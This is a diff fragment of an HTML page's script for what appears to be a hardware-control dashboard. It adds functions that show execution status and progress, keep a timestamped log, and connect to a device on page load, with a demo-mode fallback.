+    document.getElementById("execStatus").innerHTML=`Status: ${msg.status||"unknown"}<br>Progress: ${msg.progress||0}%<br>Last: ${PM.esc(msg.last_cmd||"")}`;
+    progressSpark.push(msg.progress||0);
+}
+
+function addLog(msg){
+    const log=document.getElementById("execLog");
+    log.innerHTML=`<span style="color:var(--text-dim)">${new Date().toLocaleTimeString()} </span>${PM.esc(msg)}<br>`+log.innerHTML;
+}
+
+window.addEventListener("load",async()=>{
+    initViz(); renderPayloadList();
+    try{await beam.connect();}catch(e){console.log("No hardware — demo mode");}
+});
 </script>
 </body></html>
